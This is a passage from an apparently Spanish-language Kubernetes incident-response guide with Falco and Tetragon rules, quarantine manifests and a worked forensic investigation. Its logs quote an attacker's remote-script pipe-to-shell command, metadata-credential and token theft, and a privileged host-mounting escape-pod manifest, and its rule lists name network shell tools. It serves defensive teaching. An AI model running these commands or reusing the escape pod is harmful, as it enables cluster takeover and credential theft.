        (user=%ka.user.name pod=%ka.target.namespace/%ka.target.name
         images=%ka.req.pod.containers.image privileged=%ka.req.pod.containers.privileged
         hostpid=%ka.req.pod.host_pid hostnet=%ka.req.pod.host_network
         hostpaths=%ka.req.pod.volumes.hostpath srcip=%ka.sourceips)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_privilege_escalation, T1611]

    # ---- PHASE 7: PERSISTENCE -------------------------------------------
    - rule: K8s ClusterRoleBinding To Cluster Admin
      desc: >
        A binding was created that grants cluster-admin. This is the standard
        persistence step after a token with RBAC write permission is stolen.
      condition: >
        kevt and ka.target.resource = clusterrolebindings and kmodify and allowed
        and ka.req.binding.role = cluster-admin
      output: >
        cluster-admin granted
        (user=%ka.user.name binding=%ka.target.name role=%ka.req.binding.role
         subject=%ka.req.binding.subjects srcip=%ka.sourceips userAgent=%ka.useragent)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_persistence, T1098]

    - rule: K8s Admission Webhook Modified
      desc: >
        A mutating or validating webhook configuration changed. A malicious
        mutating webhook silently injects sidecars or credentials into every
        future pod, cluster-wide, and survives all pod restarts.
      condition: >
        kevt and ka.target.resource in (mutatingwebhookconfigurations,
                                        validatingwebhookconfigurations)
        and kmodify and allowed
      output: >
        Admission webhook configuration changed
        (user=%ka.user.name resource=%ka.target.resource name=%ka.target.name
         verb=%ka.verb srcip=%ka.sourceips userAgent=%ka.useragent)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_persistence, T1554]

    # ---- PHASE 3/4: DISCOVERY AND CREDENTIAL ACCESS ---------------------
    - rule: K8s Secret Enumeration Cluster Wide
      desc: >
        A principal listed secrets across all namespaces. Legitimate workloads
        read one secret by name; cluster-wide enumeration is a credential
        harvesting pattern.
      condition: >
        kevt and ka.target.resource = secrets
        and ka.verb in (list, watch)
        and ka.target.namespace = ""
        and allowed
        and service_account_user
      output: >
        Cluster-wide secret enumeration
        (user=%ka.user.name verb=%ka.verb uri=%ka.uri srcip=%ka.sourceips
         userAgent=%ka.useragent)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_credential_access, T1552.007]

    - rule: K8s Anonymous Request Allowed
      desc: An unauthenticated principal was allowed to perform an action.
      condition: >
        kevt and allowed
        and ka.user.name in ("system:anonymous", "system:unauthenticated")
      output: >
        Anonymous request allowed
        (verb=%ka.verb uri=%ka.uri resource=%ka.target.resource
         ns=%ka.target.namespace srcip=%ka.sourceips userAgent=%ka.useragent)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_initial_access, T1078]

    # ---- PHASE 8: DEFENSE EVASION ---------------------------------------
    - rule: K8s Audit Trail Destruction
      desc: >
        Bulk deletion of Events, or deletion of a namespace holding security
        tooling. Classic anti-forensics.
      condition: >
        kevt and allowed
        and ((ka.verb = deletecollection and ka.target.resource = events)
             or (ka.verb = delete and ka.target.resource = namespaces
                 and ka.target.name in ("falco", "kube-system", "monitoring")))
      output: >
        Possible anti-forensics activity
        (user=%ka.user.name verb=%ka.verb resource=%ka.target.resource
         target=%ka.target.namespace/%ka.target.name srcip=%ka.sourceips)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_defense_evasion, T1070]
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: falco-k8saudit
  namespace: falco
  labels:
    app.kubernetes.io/name: falco
    app.kubernetes.io/component: k8saudit
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: falco
      app.kubernetes.io/component: k8saudit
  template:
    metadata:
      labels:
        app.kubernetes.io/name: falco
        app.kubernetes.io/component: k8saudit
    spec:
      # Must run on control-plane nodes: the API server dials 127.0.0.1:9765
      # from the host network namespace.
      hostNetwork: true
      dnsPolicy: ClusterFirstWithHostNet
      nodeSelector:
        node-role.kubernetes.io/control-plane: ""
      tolerations:
        - key: node-role.kubernetes.io/control-plane
          operator: Exists
          effect: NoSchedule
        - key: node-role.kubernetes.io/master
          operator: Exists
          effect: NoSchedule
      serviceAccountName: falco
      containers:
        - name: falco
          image: falcosecurity/falco-no-driver:0.41.0
          args:
            - /usr/bin/falco
            - -c
            - /etc/falco/falco.yaml
          ports:
            - name: k8saudit
              containerPort: 9765
              protocol: TCP
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            runAsNonRoot: false
            capabilities:
              drop: ["ALL"]
          resources:
            requests:
              cpu: 100m
              memory: 256Mi
            limits:
              cpu: 1000m
              memory: 1Gi
          volumeMounts:
            - name: falco-config
              mountPath: /etc/falco/falco.yaml
              subPath: falco.yaml
              readOnly: true
            - name: falco-audit-rules
              mountPath: /etc/falco/rules.d
              readOnly: true
            - name: tmp
              mountPath: /tmp
          livenessProbe:
            httpGet:
              path: /healthz
              port: 8765
            initialDelaySeconds: 30
            periodSeconds: 15
      volumes:
        - name: falco-config
          configMap:
            name: falco-k8saudit-config
        - name: falco-audit-rules
          configMap:
            name: falco-audit-rules
        - name: tmp
          emptyDir: {}
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: falco
  namespace: falco
```

### 3.4 Reglas de syscalls de Falco para las fases dentro del contenedor

`rules.d/attack-phases.yaml` — las reglas que cubren las fases 1–4 y 6, que el audit log no puede ver en absoluto.

```yaml
- required_engine_version: 0.38.0

- list: shell_binaries
  items: [ash, bash, csh, dash, ksh, sh, tcsh, zsh, busybox]

- list: network_tools
  items: [curl, wget, nc, ncat, netcat, socat, telnet, ssh, ftp, tftp]

- list: recon_tools
  items: [nmap, masscan, ping, dig, nslookup, host, arp, ip, ifconfig,
          netstat, ss, whoami, id, uname, hostname, kubectl, crictl, amicontained]

- list: package_managers
  items: [apt, apt-get, dpkg, yum, dnf, rpm, apk, pip, pip3, npm, gem]

- macro: container
  condition: (container.id != host)

- macro: spawned_process
  condition: (evt.type = execve and evt.dir = <)

- macro: sensitive_sa_token_path
  condition: (fd.name startswith "/var/run/secrets/kubernetes.io/serviceaccount")

- macro: cloud_metadata_endpoint
  condition: (fd.sip = "169.254.169.254" or fd.sip = "100.100.100.200"
              or fd.sip = "169.254.170.2")

- macro: exclude_known_agents
  condition: >
    (not container.image.repository in
      ("docker.io/falcosecurity/falco", "quay.io/cilium/tetragon",
       "registry.k8s.io/kube-proxy", "docker.io/library/fluent-bit"))

# ---- PHASE 2: EXECUTION --------------------------------------------------
- rule: Shell Spawned In Container
  desc: >
    A shell was executed inside a container. In an immutable, distroless
    production image this is impossible during normal operation and is the
    earliest reliable indicator of hands-on-keyboard activity following RCE.
  condition: >
    spawned_process and container and proc.name in (shell_binaries)
    and exclude_known_agents
  output: >
    Shell spawned in container
    (user=%user.name uid=%user.uid shell=%proc.name parent=%proc.pname
     cmdline=%proc.cmdline pid=%proc.pid ppid=%proc.ppid
     container_id=%container.id image=%container.image.repository:%container.image.tag
     ns=%k8s.ns.name pod=%k8s.pod.name node=%k8s.node.name)
  priority: WARNING
  tags: [container, shell, mitre_execution, T1059]

- rule: Package Manager Executed In Container
  desc: >
    A package manager ran at runtime. Images are built in CI; runtime
    installation means an attacker is staging tooling into the container.
  condition: >
    spawned_process and container and proc.name in (package_managers)
  output: >
    Package management tool run in container
    (user=%user.name command=%proc.cmdline
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: ERROR
  tags: [container, mitre_execution, T1059]

# ---- PHASE 3: DISCOVERY --------------------------------------------------
- rule: Container Reconnaissance Tooling
  desc: Enumeration binaries executed inside a workload container.
  condition: >
    spawned_process and container and proc.name in (recon_tools)
    and exclude_known_agents
  output: >
    Recon tool executed in container
    (tool=%proc.name cmdline=%proc.cmdline parent=%proc.pname
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: NOTICE
  tags: [container, mitre_discovery, T1613]

# ---- PHASE 4: CREDENTIAL ACCESS -----------------------------------------
- rule: ServiceAccount Token Read By Unexpected Process
  desc: >
    The projected ServiceAccount token was opened by a process that is not
    the application's own runtime. The Kubernetes client libraries read this
    file once at startup; a read by a shell or a network tool is theft.
  condition: >
    open_read and container and sensitive_sa_token_path
    and proc.name in (shell_binaries, network_tools, recon_tools)
  output: >
    ServiceAccount token read by suspicious process
    (process=%proc.name cmdline=%proc.cmdline file=%fd.name
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name node=%k8s.node.name)
  priority: CRITICAL
  tags: [container, mitre_credential_access, T1552.007]

- rule: Cloud Instance Metadata Accessed From Container
  desc: >
    A container connected to the cloud instance metadata service. This is the
    standard pivot from container RCE to cloud IAM credentials.
  condition: >
    (evt.type in (connect, sendto) and evt.dir = <)
    and container and cloud_metadata_endpoint
    and exclude_known_agents
  output: >
    Cloud metadata endpoint contacted from container
    (process=%proc.name cmdline=%proc.cmdline connection=%fd.name
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, cloud, mitre_credential_access, T1552.005]

# ---- PHASE 6: PRIVILEGE ESCALATION / ESCAPE ------------------------------
- rule: Container Escape Via Namespace Switch
  desc: >
    setns/nsenter observed, or a process entered the host mount namespace.
    This is the terminal step of a container escape.
  condition: >
    spawned_process and container
    and (proc.name = nsenter
         or proc.cmdline contains "/proc/1/ns"
         or proc.cmdline contains "/proc/1/root")
  output: >
    Container escape attempt via namespace switch
    (process=%proc.name cmdline=%proc.cmdline pid=%proc.pid
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name node=%k8s.node.name)
  priority: CRITICAL
  tags: [container, mitre_privilege_escalation, T1611]

- rule: Container Runtime Socket Accessed
  desc: >
    A container opened the container runtime socket. Write access to this
    socket is equivalent to root on the node.
  condition: >
    (evt.type in (open, openat, openat2, connect) and evt.dir = <)
    and container
    and fd.name in ("/var/run/docker.sock", "/run/containerd/containerd.sock",
                    "/var/run/crio/crio.sock", "/run/crio/crio.sock")
    and exclude_known_agents
  output: >
    Container runtime socket accessed from container
    (process=%proc.name cmdline=%proc.cmdline socket=%fd.name
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, mitre_privilege_escalation, T1610]

# ---- PHASE 7: PERSISTENCE ON THE NODE ------------------------------------
- rule: Static Pod Manifest Written
  desc: >
    A file was written into the kubelet static pod directory. A static pod is
    started directly by the kubelet, is not subject to admission control, and
    cannot be deleted through the API server. This is durable node persistence.
  condition: >
    (evt.type in (open, openat, openat2, creat, rename, renameat2)
     and evt.dir = < and evt.is_open_write = true)
    and fd.directory in ("/etc/kubernetes/manifests", "/etc/kubelet.d")
    and not proc.name in ("kubeadm", "dpkg", "rpm")
  output: >
    Static pod manifest written
    (process=%proc.name cmdline=%proc.cmdline file=%fd.name
     container_id=%container.id image=%container.image.repository
     user=%user.name node=%k8s.node.name)
  priority: CRITICAL
  tags: [host, mitre_persistence, T1543.005]

# ---- PHASE 8: DEFENSE EVASION --------------------------------------------
- rule: Security Tooling Terminated
  desc: A security agent process was killed or its kernel module unloaded.
  condition: >
    spawned_process
    and ((proc.name in (kill, pkill, killall)
          and (proc.cmdline contains "falco" or proc.cmdline contains "tetragon"
               or proc.cmdline contains "auditd"))
         or (proc.name = rmmod and proc.cmdline contains "falco")
         or (proc.name = systemctl
             and proc.cmdline contains "stop"
             and (proc.cmdline contains "falco" or proc.cmdline contains "auditd")))
  output: >
    Attempt to disable security tooling
    (process=%proc.name cmdline=%proc.cmdline user=%user.name
     container_id=%container.id ns=%k8s.ns.name pod=%k8s.pod.name
     node=%k8s.node.name)
  priority: CRITICAL
  tags: [host, mitre_defense_evasion, T1562.001]

- rule: Log File Truncated Or Deleted
  desc: Removal or truncation of audit and system logs — anti-forensics.
  condition: >
    (evt.type in (unlink, unlinkat, rename, renameat2, truncate, ftruncate)
     and evt.dir = <)
    and (fd.directory in ("/var/log/kubernetes/audit", "/var/log/audit")
         or fd.name endswith "audit.log")
    and not proc.name in ("kube-apiserver", "auditd", "logrotate", "fluent-bit", "vector")
  output: >
    Audit log tampering detected
    (process=%proc.name cmdline=%proc.cmdline file=%fd.name user=%user.name
     node=%k8s.node.name)
  priority: CRITICAL
  tags: [host, mitre_defense_evasion, T1070.002]
```

### 3.5 TracingPolicy de Tetragon — aplicación, no solo detección

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicyNamespaced
metadata:
  name: block-serviceaccount-token-theft
  namespace: prod
spec:
  kprobes:
    - call: "security_file_permission"
      syscall: false
      return: true
      args:
        - index: 0
          type: "file"
        - index: 1
          type: "int"
      returnArg:
        index: 0
        type: "int"
      returnArgAction: "Post"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Equal"
              values:
                - "/var/run/secrets/kubernetes.io/serviceaccount/token"
          matchBinaries:
            # Anything that is NOT the application binary reading the token
            - operator: "NotIn"
              values:
                - "/usr/local/bin/payment-api"
          matchActions:
            - action: Sigkill      # in-kernel enforcement, not an alert
---
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: observe-process-execution
spec:
  kprobes:
    - call: "sys_execve"
      syscall: true
      args:
        - index: 0
          type: "string"
      selectors:
        - matchNamespaces:
            - namespace: Pid
              operator: NotIn
              values:
                - "host_ns"        # container processes only
```

### 3.6 Contención del incidente: poner en cuarentena sin destruir la evidencia

La primitiva de contención es **aislamiento de red más aislamiento de planificación**, nunca la eliminación. Nótese la técnica de intercambio de etiquetas: cambiar la etiqueta del pod lo saca de los endpoints del Service *y* del selector del ReplicaSet, de modo que el controlador crea un reemplazo sano mientras el pod comprometido queda vivo y conectado para el análisis.

```yaml
# 1. Deny-all NetworkPolicy targeting the quarantine label.
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-deny-all
  namespace: prod
spec:
  podSelector:
    matchLabels:
      incident.security/quarantine: "true"
  policyTypes:
    - Ingress
    - Egress
  # Empty ingress and egress rule sets = deny everything, both directions.
  ingress: []
  egress: []
---
# 2. Optional: allow ONLY the forensic collector to reach the pod, so the
#    responder can still stream evidence out of an otherwise-isolated pod.
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-allow-forensics
  namespace: prod
spec:
  podSelector:
    matchLabels:
      incident.security/quarantine: "true"
  policyTypes:
    - Ingress
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: incident-response
          podSelector:
            matchLabels:
              app: forensic-collector
```

Job de recolección de evidencia que extrae el archivo del checkpoint desde el nodo:

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: forensic-collect-inc-2026-0805
  namespace: incident-response
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 86400
  template:
    metadata:
      labels:
        app: forensic-collector
    spec:
      restartPolicy: Never
      nodeName: node-worker-03            # pin to the compromised node
      hostPID: false
      tolerations:
        - operator: Exists                # tolerate the quarantine taint
      containers:
        - name: collector
          image: registry.internal/ir/collector:1.4.0
          command: ["/bin/sh", "-c"]
          args:
            - |
              set -euo pipefail
              INCIDENT=inc-2026-0805
              OUT=/evidence/${INCIDENT}
              mkdir -p "${OUT}"

              echo "[*] Copying CRI checkpoint archives"
              cp -av /host/var/lib/kubelet/checkpoints/*.tar "${OUT}/" || true

              echo "[*] Capturing container runtime state"
              cp -av /host/var/log/pods "${OUT}/pod-logs" || true

              echo "[*] Hashing every artifact for chain of custody"
              ( cd "${OUT}" && find . -type f -exec sha256sum {} \; ) \
                > "${OUT}/MANIFEST.sha256"

              echo "[*] Done"
              ls -la "${OUT}"
          securityContext:
            runAsUser: 0
            readOnlyRootFilesystem: true
            capabilities:
              drop: ["ALL"]
              add: ["DAC_READ_SEARCH"]
          volumeMounts:
            - name: host-kubelet
              mountPath: /host/var/lib/kubelet
              readOnly: true
            - name: host-podlogs
              mountPath: /host/var/log/pods
              readOnly: true
            - name: evidence
              mountPath: /evidence
      volumes:
        - name: host-kubelet
          hostPath:
            path: /var/lib/kubelet
            type: Directory
        - name: host-podlogs
          hostPath:
            path: /var/log/pods
            type: Directory
        - name: evidence
          persistentVolumeClaim:
            claimName: forensic-evidence-wormstore
```

---

## 4. Comandos CLI y salida real de terminal

### 4.1 Confirmar que el pipeline de auditoría está vivo

```
$ sudo ls -la /var/log/kubernetes/audit/
total 184320
drwxr-xr-x 2 root root      4096 Aug  5 09:14 .
drwxr-xr-x 4 root root      4096 Aug  1 00:00 ..
-rw------- 1 root root 187293184 Aug  5 14:21 audit.log
-rw------- 1 root root  12884901 Aug  4 22:03 audit-2026-08-04T22-03-11.117.log.gz

$ sudo tail -n 1 /var/log/kubernetes/audit/audit.log | jq -c '{stage,verb,uri:.requestURI,user:.user.username}'
{"stage":"ResponseComplete","verb":"list","uri":"/api/v1/namespaces/prod/pods?limit=500","user":"system:serviceaccount:monitoring:prometheus"}

$ sudo grep -c '"kind":"Event"' /var/log/kubernetes/audit/audit.log
1428193
```

### 4.2 Detección de fase — la alerta de runtime que abre el incidente

```
$ kubectl -n falco logs -l app.kubernetes.io/name=falco --tail=20 -f
14:18:02.114398219: Warning Shell spawned in container (user=root uid=0 shell=sh parent=node cmdline=sh -c "curl -s http://185.220.101.7/x.sh | sh" pid=214417 ppid=214392 container_id=8f3c2a91b4de image=registry.internal/prod/payment-api:2.9.1 ns=prod pod=payment-api-7d9c4f8b6-2xk9v node=node-worker-03)
14:18:04.882910337: Notice Recon tool executed in container (tool=id cmdline=id parent=sh container_id=8f3c2a91b4de image=registry.internal/prod/payment-api ns=prod pod=payment-api-7d9c4f8b6-2xk9v)
14:18:07.331004112: Critical ServiceAccount token read by suspicious process (process=cat cmdline=cat /var/run/secrets/kubernetes.io/serviceaccount/token file=/var/run/secrets/kubernetes.io/serviceaccount/token container_id=8f3c2a91b4de image=registry.internal/prod/payment-api ns=prod pod=payment-api-7d9c4f8b6-2xk9v node=node-worker-03)
14:18:09.007712558: Critical Cloud metadata endpoint contacted from container (process=curl cmdline=curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ connection=10.244.3.17:41220->169.254.169.254:80 container_id=8f3c2a91b4de image=registry.internal/prod/payment-api ns=prod pod=payment-api-7d9c4f8b6-2xk9v)
```

Cuatro fases en siete segundos: Execution → Discovery → Credential Access → Credential Access (nube). El campo `parent=node` es la prueba irrefutable de la fase 1: el propio proceso de la aplicación Node.js lanzó la shell, lo que significa que el acceso inicial fue una RCE de capa de aplicación, no una credencial `kubectl` robada.

### 4.3 Pivotar al audit log con la identidad robada

La alerta de runtime da el pod. Resolvé el pod a su ServiceAccount y luego buscá en el audit log qué hizo esa identidad:

```
$ kubectl -n prod get pod payment-api-7d9c4f8b6-2xk9v \
    -o jsonpath='{.spec.serviceAccountName}{"\n"}{.metadata.uid}{"\n"}{.status.podIP}{"\n"}'
payment-api
5c1e9d34-7a2b-4f18-9e6c-3a0b12d4e5f7
10.244.3.17
```

```
$ sudo jq -c 'select(.user.username == "system:serviceaccount:prod:payment-api")
              | {t: .requestReceivedTimestamp, verb, uri: .requestURI,
                 code: .responseStatus.code, src: .sourceIPs[0], ua: .userAgent}' \
    /var/log/kubernetes/audit/audit.log | tail -n 12
{"t":"2026-08-05T14:18:22.441029Z","verb":"get","uri":"/api/v1/namespaces/prod/pods","code":403,"src":"10.244.3.17","ua":"curl/8.5.0"}
{"t":"2026-08-05T14:18:31.882117Z","verb":"list","uri":"/api/v1/namespaces/prod/secrets","code":200,"src":"10.244.3.17","ua":"curl/8.5.0"}
{"t":"2026-08-05T14:18:35.104773Z","verb":"get","uri":"/api/v1/namespaces/prod/secrets/ci-registry-pull","code":200,"src":"10.244.3.17","ua":"curl/8.5.0"}
{"t":"2026-08-05T14:18:41.669902Z","verb":"list","uri":"/api/v1/secrets","code":403,"src":"10.244.3.17","ua":"curl/8.5.0"}
{"t":"2026-08-05T14:19:02.338451Z","verb":"create","uri":"/api/v1/namespaces/prod/pods","code":201,"src":"10.244.3.17","ua":"curl/8.5.0"}
```

Tres hallazgos, de inmediato:

1. **`userAgent: curl/8.5.0`** — un cliente legítimo dentro del clúster es un SDK de Kubernetes (`kubernetes-python/…`, `kubernetes-client-java/…`, `client-go/v0.34.0`). Un `curl` crudo desde un ServiceAccount es una firma de actividad manual en teclado.
2. **El patrón 403 → 200 → 403** es sondeo de permisos: el actor está mapeando el límite del RBAC del token.
3. **`create` sobre `pods` devolvió 201** — la fase 6 ha comenzado.

Inspeccioná exactamente qué crearon. Por esto la sección A5 de la audit policy usa `level: Request` — sin el cuerpo no se puede responder esta pregunta:

```
$ sudo jq 'select(.user.username == "system:serviceaccount:prod:payment-api"
                  and .verb == "create"
                  and .objectRef.resource == "pods")
           | .requestObject.spec' \
    /var/log/kubernetes/audit/audit.log | tail -n 40
{
  "volumes": [
    {
      "name": "hostroot",
      "hostPath": {
        "path": "/",
        "type": "Directory"
      }
    }
  ],
  "containers": [
    {
      "name": "shell",
      "image": "docker.io/library/alpine:3.20",
      "command": ["/bin/sh", "-c", "sleep 86400"],
      "resources": {},
      "volumeMounts": [
        {
          "name": "hostroot",
          "mountPath": "/host"
        }
      ],
      "securityContext": {
        "privileged": true
      }
    }
  ],
  "hostPID": true,
  "hostNetwork": true,
  "nodeName": "node-worker-03",
  "restartPolicy": "Never",
  "serviceAccountName": "payment-api"
}
```

Un pod privilegiado, con `hostPID`, `hostNetwork` y `/` montado en `/host`, fijado al mismo nodo. Eso es una toma completa del nodo en un solo manifiesto, y fue **admitido** — lo cual es en sí mismo un hallazgo: Pod Security Admission no estaba aplicando `restricted` (ni `baseline`) sobre el namespace `prod`.

### 4.4 Reconstruir la línea de tiempo completa del actor

```
$ sudo jq -r 'select(.sourceIPs[0] == "10.244.3.17")
              | [.requestReceivedTimestamp, .user.username, .verb,
                 (.objectRef.resource // "-"), (.objectRef.subresource // "-"),
                 (.objectRef.namespace // "-"), (.objectRef.name // "-"),
                 (.responseStatus.code|tostring)] | @tsv' \
    /var/log/kubernetes/audit/audit.log | sort | column -t
2026-08-05T14:18:22Z  system:serviceaccount:prod:payment-api  get     pods        -     prod  -                403
2026-08-05T14:18:31Z  system:serviceaccount:prod:payment-api  list    secrets     -     prod  -                200
2026-08-05T14:18:35Z  system:serviceaccount:prod:payment-api  get     secrets     -     prod  ci-registry-pull 200
2026-08-05T14:18:41Z  system:serviceaccount:prod:payment-api  list    secrets     -     -     -                403
2026-08-05T14:19:02Z  system:serviceaccount:prod:payment-api  create  pods        -     prod  escape-pod       201
2026-08-05T14:19:44Z  system:serviceaccount:prod:payment-api  create  pods        exec  prod  escape-pod       101
2026-08-05T14:23:18Z  system:serviceaccount:kube-system:node-agent  create  clusterrolebindings  -  -  backup-operator  201
```

La última línea es la transición de fase. Una identidad *distinta* — `kube-system:node-agent` — creó un `ClusterRoleBinding` cuatro minutos después, desde la misma IP de origen. Eso significa que el atacante escapó al nodo y cosechó un segundo token, más privilegiado, desde `/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected-token-*/token`.

Verificá el binding:

```
$ sudo jq 'select(.objectRef.resource=="clusterrolebindings" and .verb=="create")
           | {user: .user.username, name: .objectRef.name,
              role: .requestObject.roleRef.name,
              subjects: .requestObject.subjects,
              src: .sourceIPs[0]}' \
    /var/log/kubernetes/audit/audit.log | tail -n 20
{
  "user": "system:serviceaccount:kube-system:node-agent",
  "name": "backup-operator",
  "role": "cluster-admin",
  "subjects": [
    {
      "kind": "ServiceAccount",
      "name": "backup-agent",
      "namespace": "kube-system"
    }
  ],
  "src": "10.244.3.17"
}
```

**Fase 7 confirmada.** Una puerta trasera `cluster-admin` durmiente ligada a un ServiceAccount de nombre inocuo. Si solo se hubiera contenido el pod original, esto habría sobrevivido y el actor habría vuelto dentro de la hora.

### 4.5 Cazar el resto de la persistencia

Nunca asumas una sola puerta trasera. Barré todas las primitivas de persistencia estándar:

```
$ kubectl get clusterrolebindings -o json | jq -r '
    .items[]
    | select(.roleRef.name=="cluster-admin")
    | [.metadata.name, .metadata.creationTimestamp,
       ([.subjects[]? | "\(.kind)/\(.namespace // "-")/\(.name)"] | join(","))]
    | @tsv' | column -t
cluster-admin           2025-11-02T08:14:22Z  Group/-/system:masters
kubeadm:cluster-admins  2025-11-02T08:14:22Z  Group/-/kubeadm:cluster-admins
backup-operator         2026-08-05T14:23:18Z  ServiceAccount/kube-system/backup-agent
```

```
$ kubectl get mutatingwebhookconfigurations,validatingwebhookconfigurations \
    -o custom-columns='KIND:.kind,NAME:.metadata.name,CREATED:.metadata.creationTimestamp'
KIND                             NAME                      CREATED
MutatingWebhookConfiguration     pod-identity-webhook      2025-11-02T09:01:44Z
MutatingWebhookConfiguration     metrics-injector          2026-08-05T14:26:07Z
ValidatingWebhookConfiguration   gatekeeper-validating      2025-11-02T09:04:12Z

$ kubectl get mutatingwebhookconfiguration metrics-injector -o yaml | \
    yq '.webhooks[] | {name: .name, url: .clientConfig.url, rules: .rules}'
name: inject.metrics.local
url: https://185.220.101.7:8443/mutate
rules:
  - apiGroups: ["*"]
    apiVersions: ["*"]
    operations: ["CREATE"]
    resources: ["pods"]
    scope: "*"
```

Un mutating webhook apuntando a una **dirección IP externa**, que coincide con toda creación de pod en todo el clúster. Este es el artefacto de mayor severidad de todo el incidente: reescribe cada pod futuro del clúster.

```
$ kubectl get cronjobs -A --sort-by=.metadata.creationTimestamp \
    -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,SCHEDULE:.spec.schedule,IMAGE:.spec.jobTemplate.spec.template.spec.containers[*].image,CREATED:.metadata.creationTimestamp'
NS            NAME              SCHEDULE       IMAGE                              CREATED
prod          db-backup         0 2 * * *      registry.internal/ops/pgdump:1.2   2025-11-14T10:02:31Z
kube-system   kube-cleanup      */5 * * * *    docker.io/library/alpine:3.20      2026-08-05T14:27:55Z
```

```
$ for n in $(kubectl get nodes -o name); do
    echo "=== $n"
    kubectl debug $n -it --image=busybox:1.36 --profile=sysadmin -- \
      ls -la /host/etc/kubernetes/manifests/ 2>/dev/null | tail -n +2
  done
=== node/node-worker-03
total 20
drwxr-xr-x 2 root root 4096 Aug  5 14:29 .
drwxr-xr-x 4 root root 4096 Nov  2  2025 ..
-rw------- 1 root root 1421 Aug  5 14:29 kube-metrics-agent.yaml
```

Un manifiesto de static pod, escrito a las 14:29 en el nodo comprometido. Los static pods los lanza el kubelet directamente, nunca pasan por el control de admisión y **no se pueden eliminar con `kubectl delete pod`** — el kubelet los recrea. Hay que quitarlos del sistema de archivos del nodo.

### 4.6 Contención sin destrucción de evidencia

**Paso 1 — capturar el contenedor antes de tocar nada.** El checkpointing CRI (`ContainerCheckpoint`, en beta y activado por defecto desde Kubernetes v1.30) es el único método que preserva la memoria de los procesos mientras el contenedor sigue corriendo:

```
$ sudo curl -sk -X POST \
    --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt \
    --key  /etc/kubernetes/pki/apiserver-kubelet-client.key \
    "https://node-worker-03:10250/checkpoint/prod/payment-api-7d9c4f8b6-2xk9v/app" | jq .
{
  "items": [
    "/var/lib/kubelet/checkpoints/checkpoint-payment-api-7d9c4f8b6-2xk9v_prod-app-2026-08-05T14:31:07Z.tar"
  ]
}

$ sudo ls -lh /var/lib/kubelet/checkpoints/
total 412M
-rw------- 1 root root 412M Aug  5 14:31 checkpoint-payment-api-7d9c4f8b6-2xk9v_prod-app-2026-08-05T14:31:07Z.tar

$ sudo tar -tf /var/lib/kubelet/checkpoints/checkpoint-*.tar | head
bind.mounts
checkpoint/
checkpoint/core-1.img
checkpoint/pagemap-1.img
checkpoint/pages-1.img
checkpoint/fdinfo-2.img
checkpoint/files.img
config.dump
dump.log
rootfs-diff.tar
spec.dump
stats-dump
```

`rootfs-diff.tar` contiene todos los archivos que el atacante escribió dentro del contenedor; `pages-1.img` es la imagen de memoria de los procesos.

**Paso 2 — congelar la ruta de red, mantener el pod vivo.**

```
$ kubectl -n prod label pod payment-api-7d9c4f8b6-2xk9v incident.security/quarantine=true
pod/payment-api-7d9c4f8b6-2xk9v labeled

$ kubectl apply -f quarantine-deny-all.yaml
networkpolicy.networking.k8s.io/quarantine-deny-all created

$ kubectl -n prod label pod payment-api-7d9c4f8b6-2xk9v app-             # strip the selector label
pod/payment-api-7d9c4f8b6-2xk9v unlabeled

$ kubectl -n prod get pods -l app=payment-api
NAME                           READY   STATUS    RESTARTS   AGE
payment-api-7d9c4f8b6-h4m2p    1/1     Running   0          18s      # ReplicaSet healed the service
payment-api-7d9c4f8b6-9nqz4    1/1     Running   0          6d
payment-api-7d9c4f8b6-tv8lc    1/1     Running   0          6d

$ kubectl -n prod get pod payment-api-7d9c4f8b6-2xk9v
NAME                           READY   STATUS    RESTARTS   AGE
payment-api-7d9c4f8b6-2xk9v    1/1     Running   0          6d       # quarantined, still alive
```

**Paso 3 — aislar el nodo.**

```
$ kubectl cordon node-worker-03
node/node-worker-03 cordoned

$ kubectl taint node node-worker-03 incident.security/quarantine=true:NoExecute
node/node-worker-03 tainted

$ kubectl get node node-worker-03 -o wide
NAME             STATUS                     ROLES    AGE    VERSION   INTERNAL-IP
node-worker-03   Ready,SchedulingDisabled   <none>   276d   v1.34.0   10.0.1.23
```

> **El orden importa.** `NoExecute` desaloja todo pod que no tolere el taint — incluido el pod de evidencia en cuarentena, a menos que le agregues la toleración antes, e incluido el Job de recolección forense a menos que también la tolere (por eso el manifiesto del Job en §3.6 lleva `tolerations: [{operator: Exists}]`). Si solo necesitás detener nueva planificación, `cordon` solo es más seguro.

**Paso 4 — triage en vivo con un contenedor efímero** (no reinicia el objetivo, no requiere una shell en la imagen):

```
$ kubectl -n prod debug payment-api-7d9c4f8b6-2xk9v -it \
    --image=nicolaka/netshoot:v0.13 --target=app --profile=general -- bash
